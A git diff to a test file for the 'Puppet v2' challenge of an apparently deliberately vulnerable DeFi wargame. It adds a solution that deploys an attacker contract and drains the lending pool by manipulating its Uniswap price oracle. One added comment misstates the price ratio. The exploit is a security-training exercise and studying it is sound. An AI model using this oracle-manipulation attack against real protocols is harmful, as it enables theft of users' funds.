@@ -62,12 +62,24 @@ describe("[Challenge] Puppet v2", function () {
         await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
 
         // Check pool's been correctly setup
-        expect(await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)).to.eq(3n * 10n ** 17n);
-        expect(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).to.eq(300000n * 10n ** 18n);
+        expect(await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)).to.eq(3n * 10n ** 17n); // 1 eth = 0.3 DVT (deposit factor of 3x)
+        expect(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).to.eq(300000n * 10n ** 18n); // 1m ETH = 300k DVT
     });
 
     it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
+        const AttackerPuppetV2Factory = await ethers.getContractFactory("AttackerPuppetV2");
+        const attackerPuppetV2 = await AttackerPuppetV2Factory.deploy(
+            lendingPool.address,
+            uniswapRouter.address,
+            token.address,
+            player.address,
+            POOL_INITIAL_TOKEN_BALANCE,
+            PLAYER_INITIAL_TOKEN_BALANCE
+        );
+
+        await token.connect(player).transfer(attackerPuppetV2.address, PLAYER_INITIAL_TOKEN_BALANCE); // Give DVT to the attacker
+        await attackerPuppetV2.connect(player).attack({ value: PLAYER_INITIAL_ETH_BALANCE - 10n ** 17n }); // Attack with all of the ETH balance (-0.1 ETH for fees)
     });
 
     after(async function () {
